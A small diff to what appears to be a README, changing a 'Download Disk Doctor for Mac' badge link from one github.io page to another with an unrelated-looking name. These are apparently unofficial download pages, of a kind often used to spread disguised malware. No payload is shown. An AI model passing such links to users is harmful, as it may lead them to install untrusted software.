@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![📥 Download Disk Doctor Mac](https://img.shields.io/badge/📥_Download_Disk_Doctor_for_Mac-blue?style=for-the-badge&logo=apple)](https://install-quick-software.github.io/.github/diskdoctor)
+[![📥 Download Disk Doctor Mac](https://img.shields.io/badge/📥_Download_Disk_Doctor_for_Mac-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/diskdoctor)
 
 </div>
 
